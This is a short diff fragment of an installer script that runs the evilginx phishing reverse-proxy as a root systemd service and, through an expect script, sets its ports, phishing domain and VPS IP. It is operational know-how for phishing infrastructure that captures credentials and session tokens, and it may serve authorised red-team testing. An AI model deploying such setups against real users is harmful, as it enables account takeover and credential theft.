@@ -594,7 +594,7 @@ Wants=network-online.target
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx -p $EVILGINX_DIR/phishlets
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
@@ -627,10 +627,16 @@ EOF
 set timeout 10
 log_user 1
 
-spawn /usr/local/bin/evilginx -p $EVILGINX_DIR/phishlets
+spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    -re "evilginx\s+>" { 
+    -re "evilginx\s+>" {
+        send "config https_port 8443\r"
+        expect -re "evilginx\s+>"
+        send "config http_port 8081\r"
+        expect -re "evilginx\s+>"
+        send "config dns_port 0\r"
+        expect -re "evilginx\s+>"
         send "config domain $DOMAIN\r"
         expect -re "evilginx\s+>"
         send "config ipv4 $VPS_IP\r"
